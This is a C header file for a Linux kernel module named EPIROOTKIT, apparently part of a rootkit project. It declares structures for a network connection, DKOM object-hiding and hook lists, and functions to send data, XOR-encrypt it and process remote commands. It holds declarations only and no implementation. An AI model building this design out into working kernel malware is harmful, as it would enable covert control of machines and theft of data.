#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>
#include <linux/jiffies.h>
#include <linux/delay.h>

struct network_manager {
    struct socket *connection;
    bool is_connected;
    spinlock_t lock;
};

struct dkom_entry {
    void *object;
    struct list_head list;
};

struct hook_entry {
    void *target;
    struct list_head list;
};

extern struct list_head dkom_entries;
extern struct list_head hook_entries;
extern spinlock_t hook_lock;

// Function declarations
void dkom_restore_object(void *object);
void remove_hook(void *target);
void send_error(int error_code, const char *message);
void send_data(const char *data);
void apply_xor_cipher(char *data, int len);
void process_command(const char *command);

#endif // EPIROOTKIT_H 